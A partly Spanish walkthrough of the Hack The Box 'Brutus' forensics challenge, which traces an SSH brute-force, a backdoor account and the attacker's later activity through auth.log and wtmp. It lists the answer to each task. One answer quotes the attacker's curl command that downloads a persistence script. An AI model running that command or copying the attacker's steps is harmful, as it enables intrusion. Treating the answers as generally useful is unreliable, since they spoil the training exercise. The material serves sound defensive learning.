##### Sherlock Scenario

In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.

Brutus.zip

La respuesta está marcada ==`así`==
### Task 1
Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

==`65.2.161.68`==

### Task 2
The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

==`root`==

### Task 3
Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

`Para poder usar el servicio utmp es necesario instalarlo` https://github.com/neko-neko/utmpdump/releases/tag/v2.0.0

Como es un servicio directamente descargado hacemos lo siguiente:
```
wget https://github.com/neko-neko/utmpdump/releases/download/v2.0.0/utmpdump_linux_amd64
```

Cambiamos el nombre del servicio y lo movemos a /usr/bin/
```
mv utmpdump_linux_amd64 utmpdump    
```
```
mv utmpdump /usr/bin  
```

Ejecutamos el comando para poder leer el wtmp

```
utmpdump -f wtmp
```


Veremos un montón de líneas en las que tenemos que identificar la IP de la maquina atacante 
```
{"Type":7,"Pid":2549,"Device":"pts/1","Id":"","User":"root","Host":"65.2.161.68","Exit":{"Termination":0,"Exit":0},"Session":0,"Time":"Wed, 06 Mar 2024 07:32:45 CET","Addr":"65.2.161.68"} 
```

Está hora esta en CET, la pasamos a UTC y tenemos la respuesta.

==`2024-03-06 06:32:45`==


### Task 4
SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

![[Pasted image 20251018181421.png]]

==`37`==

### Task 5
The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

![[Pasted image 20251018181540.png]]

==`cyberjunkie`==

### Task 6
What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

==`T1136.001`==

### Task 7
What time did the attacker's first SSH session end according to auth.log?

==`2024-03-06 06:37:24`==

### Task 8
The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

![[Pasted image 20251018182752.png]]

==`/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`==
